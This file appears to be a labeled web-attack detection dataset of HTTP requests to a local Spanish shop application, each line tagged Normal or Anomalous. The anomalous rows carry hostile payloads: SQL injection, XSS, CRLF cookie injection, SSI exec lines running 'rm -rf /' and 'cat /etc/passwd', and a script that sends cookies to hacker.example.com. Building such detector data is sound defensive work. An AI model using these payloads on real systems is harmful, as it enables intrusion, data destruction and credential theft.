Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Anomalous 0 GET  http://localhost:8080/mail.box HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Normal 1 POST modo=registro&login=louise&password=d%E1nica&nombre=Lara&apellidos=Barot+Holm&email=quilley0%40frenchpolynesia.com.st&dni=80135646N&direccion=Avinguda+Carrilet%2C+21%2C+&ciudad=Torres+de+la+Alameda&cp=50529&provincia=Cuenca&ntc=2796348455963884&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=vasiliad&password=tiQU73M77UiS&nombre=Virma&apellidos=Catolino+Florensa&email=ridges%40fotoseroticas.com.cx&dni=67499126Z&direccion=Plza.+Mayor%2C+166%2C+&ciudad=Camari%F1as&cp=3871A&provincia=Almer%EDa&ntc=4709387607686346&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1882&B1=Confirmar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=4&B1=A%F1adir+al+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nolie&pwd=nort%24e%D1a&remember=on&B1=Entrar HTTP/1.1
Anomalous 1 POST modo=entrar&login=nolter&pwd=%27+AND+%271%27%3D%271&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mcculloc&password=menju%ED&nombre=Iris&apellidos=Subir%F3s+Figaredo&email=duo_davalos%40designworld.cz&dni=23251820Q&direccion=Isla+De+Cuba+85+3-B&ciudad=Coripe&cp=06927&provincia=Navarra&ntc=6612706535332212&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yueping1&password=f9e2dora&nombre=Harissa&apellidos=Aregall+Picabea&email=goorwitz-sejbalova%40hostingprofessional.com.jobs&dni=66204492G&direccion=%22+AND+%221%22%3D%221&ciudad=Font+d%27En+Carr%F2s%2C+la&cp=29551&provincia=Huelva&ntc=3999806738331009&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pepple&password=endelgadecer&nombre=Nolsaco&apellidos=Antol%EDnez+Tamallangos&email=hassall%40007tv.nf&dni=80856285S&direccion=C%2F+Capitanes+Ripoll%2C+68%2C+9-G&ciudad=Pajaroncillo&cpA=01120&provincia=Madrid&ntc=3246974816793870&B1=Registrar HTTP/1.1
Normal 0 POST id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/6909030637832563290.jsp.java HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%257C HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg~ HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=turus&pwd=e2toc8da&remember=off&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Normal 0 POST errorMsg=Credenciales+incorrectas http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melisse&pwd=pleit%E9s&remember=on&B1A=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Anomalous 0 POST modo=entrar&login=*corn%27eliu&pwd=dESHILadIZ&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/imagenes.INC HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%4040 HTTP/1.1
Anomalous 1 POST modo=registro&login=von_ende6&password=2er9rqu5a&nombre=Set-cookie%253A%2BTamper%253D1041264011025374727&apellidos=Nebot+Curell&email=vadis%40clubdegolf.com.gf&dni=05120273J&direccion=C%2F+Guardia+Civil+181+10%3FE&ciudad=Albal%E1&cp=42107&provincia=Guadalajara&ntc=6734713412721708&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=yingcdi&password=pisa-verde&nombre=Vianella&apellidos=Galdeano+Piccech&email=dudgeon%40tradora.na&dni=80818838N&direccion=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ciudad=Gormaz&cp=32737&provincia=Zaragoza&ntc=0673547824413217&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=whited&password=coyotera&nombre=L%3Feonora&apellidos=Tranwincky+Selman&email=griem%40bloger%F3tico.nz&dni=28828668P&direccion=Zenobia%2C+197+8G&ciudad=Cabra+del+Camp&cp=15350&provincia=Valencia&ntc=3322562441567993&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 POST modo=insertar&precio=1124&B1=Confirmar%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kavaler&pwd=timb44&remember=off&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/iisadmpwd/aexp3.htr HTTP/1.1
Anomalous 1 POST id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=92&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%7C&precio=5930&B1=Pasar+por+caja HTTP/1.1
Anomalous 1 POST modo=insertar&precio=8137&B1=Pasar+por+caja%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
Anomalous 1 PUT id=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Anomalous 1 POST id=3&nombre=Queso+Manchegoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=39&cantidad=82&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 1 POST modo=registro&login=winters&password=pat%21entemente&nombre=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&apellidos=Mollejasl&email=wepper.cros%40miplat.kh&dni=91976235V&direccion=Calle+San+Froilan+74+&ciudad=San+Miguel+de+Bernuy&cp=06410&provincia=Barcelona&ntc=3866167824231022&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sparks&pwd=569t179e&remember=on%2F&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=deek&password=denunciadora&nombreA=Salina&apellidos=Gir%F3n+Cece%F1as&email=un-hi%40tarifasdevuelos.et&dni=55199080T&direccion=Tecla+Sala+74+&ciudad=Castrillo+de+Villavega&cp=18818&provincia=M%E1laga&ntc=7068244348344945&B1=Registrar HTTP/1.1
Anomalous 1 POST id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Anomalous 1 POST idA=2 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2520 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/miembros/index.jsp/ HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
Anomalous 1 POST modo=registro&login=cher5&password=estr1pa69cio&nombre=Acucio&apellidos=Revert%E9+Martinho&email=kiga%40casabolsa43.ky&dniA=84245966W&direccion=Calle+Pachin+De+Melas+143%2C+8D&ciudad=Son+Servera&cp=31154&provincia=Madrid&ntc=4412645005602081&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=malott&password=guayabo&nombre=Dalmiro&apellidos=Farr%E9&email=haddon%40hiperbarcelona.tl&dni=29424173C&direccion=Plza.+Luis+Cernuda%2C+88+&ciudad=Villodrigo&cp=08580&provincia=Sevilla&ntc=0604900519989178&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Anomalous 1 POST B2=%2B http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=widuch&password=o7TOp%E9dIca&nombre=Belindo&apellidos=Calet&email=gassman%40itrends.gs&dni=54927886E&direccion=Memorial+Nu%F1ez+Blanca+193%2C+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar HTTP/1.1
Anomalous 1 POST modo=registro&login=fleurima&password=sa924a9u25&nombre=Ladislada&apellidos=Aregall+Picabea&email=ursitti%40nightflight.dm%252B&dni=88865484Q&direccion=Merced%2C+63+&ciudad=Valdemierque&cp=08784&provincia=C%E1ceres&ntc=5240985649337180&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mirarchi&pwd=garaM2nTE&remember=on&B1=Entrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/webapp/examples/showcfg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
Anomalous 1 GET  http://localhost:8080/iisstart.htm HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sosa&pwd=FraCcIoNArIo&remember=on&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7743&B1=Pasar+por+caja HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Normal 0 POST id=2&nombre=Queso+Manchego&precio=100&cantidad=61&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Normal 1 POST id=3&nombre=Queso+Manchego&precio=39&cantidad=84&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=hofstett&password=furtivo&nombre=Bartolomea&apellidos=Villal%F3n&email=woodbridge%40coworkers.%40museum&dni=19895681Z&direccion=Santa+Maria+De+Mazzarello+185%2C+&ciudad=Caba%F1as+de+la+Sagra&cp=17770&provincia=Tarragona&ntc=4479205024871909&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/salir.jsp.bak HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=toulson&password=79p2lis25&nombre=Maila&apellidos=Ciezar&email=dafydd%40mytanga.nf&dni=41724359J&direccion=C%2F+Santa+Clara+126%2C+6%3FE&ciudad=Onzonilla&cp=19461&provincia=Ourense&ntc=1957012493079149&B1=Registrar HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mtl%2500&pwd=r22camien5%2B9&remember=off&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=briard&password=ur7anismo&nombre=Vitalbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Bonafina+Cansino&email=gayou%40transportesvegasl.bm&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar HTTP/1.1
Normal 0 POST modo=entrar&login=bnrinfo&pwd=fasc%21es&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 POST modo=insertar&precio=1761&B1=Pasar+por+caja%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous 1 POST modoA=entrar&login=hatti&pwd=centilitro&remember=off&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=79&B1=Confirmar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 GET  http://localhost:8080.Inc HTTP/1.1
Anomalous 1 POST modo=insertar&precio=1633&B1=Confirmar%27INJECTED_PARAM http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous 1 POST B2=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/imagenes~ HTTP/1.1
Anomalous 1 POST B2A=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=hu*yv%3Fan&password=atab2rdi8la7O&nombre=Adelfo&apellidos=Stumptner&email=lembeck%40tuslimites.fo&dni=72510261R&direccion=Passeig+Bejar%2C+173+2H&ciudad=Quir%F3s&cp=41930&provincia=Girona&ntc=9285059001165712&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=student%27INJECTED_PARAM&password=ali0557ra&nombre=Jaled&apellidos=Miralles+Casola&email=manni%40yiutuve.mk&dni=37782618N&direccion=Travessera+De+Gracia+53+&ciudad=Tollos&cp=23264&provincia=Pontevedra&ntc=5024784015351535&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A HTTP/1.1
Normal 0 POST B2=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Normal 0 POST errorMsg=Credenciales+incorrectas http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous 1 POST id=2&nombre=Vino+Rioja&precio=100&cantidad=69&B1=A%F1adir+al+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hatz&pwd=oretana&remember=on&B1=Entrar HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gonsalve&password=ir%F3n0co&nombre=Nalia&apellidos=Delemos+Altimirs&email=masters-mcnear%40costablancarental.ax&dni=46643257Q&direccion=C%2F+Ciutat+Freta%2C+37+&ciudad=Corpa&cp=05154&provincia=Huesca&ntc=5657119326927439&B1=Registrar HTTP/1.1
Normal 0 POST modo=registro&login=digenova&password=7as7211%D10&nombre=Maximiliano&apellidos=Puges+C%E1rcamo&email=hilburn%40sanchezgordo.es&dni=86475524D&direccion=C%2F+Arquitecto+Hernandez+Rubio%2C+101%2C+1H&ciudad=Pineda+de+la+Sierra&cp=32621&provincia=Soria&ntc=5886675578398805&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
Anomalous 1 POST modo=insertar&precio=9036&B1=Pasar+por+caja%2F http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 0 GET  http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dadang&pwd=mo%2Fn2ep%2F%EDo&remember=on&B1=Entrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
Anomalous 1 POST modo=registro&login=gray&password=2s4e49&nombre=Sadao&apellidos=Mengual+Bartumeu&email=mckinnell%40arvigar.eu&dni=43595909F&direccion=Calle+Arenal+153%2C+&ciudad=Hornos+de+Moncalvillo%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=34349&provincia=Granada&ntc=4118559502333875&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9253&B1=Pasar+por+caja HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%7C HTTP/1.1
Normal 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pillars4&password=berber%ED&nombre=Graciano&apellidos=Rubi+De+Biasi&email=michalowski%40lodgeinmadrid.mu&dni=05781002K&direccion=Calle+Opera+197%2C+&ciudad=San+Juan+del+Olmo&cp=04740&provincia=Cuenca&ntc=5937893714425522&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/asf-logo-wide.gif.bak HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Anomalous 1 POST errorMsg=%7C http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A HTTP/1.1
Normal 0 POST id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 1 POST modo=registro&login=whisler&password=bienfEcho-r&nombre=Helvio&apellidos=Catchot+Bacard%ED&email=clendenning%40frioelectric.web&dni=85624451M&direccion=Calle+Doctor+Fleming%2C+7%2C+7-D&ciudad=Cerro%2C+El&cp=09640&provincia=Girona&ntc=6959239796912888&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Anomalous 1 POST modo=entrar&login=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&pwd=culero&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/samples/dbsamp/dbsamp.htm HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=arne&password=AREnillA&nombre=Malaqu%EDas&apellidos=Bota+Gifre&email=herdegen-vehil%40cortinas-de-aire.ar&dni=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&direccion=C%2F+Sabugo%2C+157%2C+&ciudad=Valdevacas+de+Montejo&cp=26339&provincia=Tarragona&ntc=6852146150685245&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Anomalous 1 POST idA=1 http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Normal 1 POST modo=registro&login=yan-shek&password=89vI3o58&nombre=Katherina&apellidos=Amodeo+Sidany&email=burns-gerron%40100mbps.ht&dni=60586849L&direccion=C%2F+Juan+Ramon+Jimenez%2C+135%2C+11D&ciudad=Sotalbo&cp=35470&provincia=Teruel&ntc=3613851570942455&B1=Registrar http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
Normal 0 POST B2=Vaciar+carrito http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kam%3Fins%2Fky&password=sonetO&nombre=Leslie&apellidos=Arrotcharen+Doniz&email=bernstein%40beltoan.com.ck&dni=11552656D&direccion=U%F1as+83%2C+&ciudad=Villatuelda&cp=44410&provincia=Segovia&ntc=3775854370379113&B1=Registrar HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
Anomalous 1 GET  http://localhost:8080/servlet/snoop2 HTTP/1.1
Anomalous 1 POST errorMsgA=Credenciales+incorrectas http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous 1 GET  http://localhost:8080/4861362529278789730~ HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
Anomalous 1 POST modoA=entrar&login=rizzardi&pwd=332G3le8a&remember=on&B1=Entrar http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=%2520&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous 1 POST id=1&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=72&B1=A%F1adir+al+carrito http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Normal 0 GET  http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
Anomalous 1 POST modo=registro&login=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&password=plant%EDgrad*a&nombre=Tranquilino&apellidos=Atienza+Carrillo&email=goldoni%40923.pa&dni=63154198Q&direccion=Rua+Entrevias%2C+68+12-C&ciudad=Massalfassar&cp=48220&provincia=Salamanca&ntc=5370548572435408&B1=Registrar http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
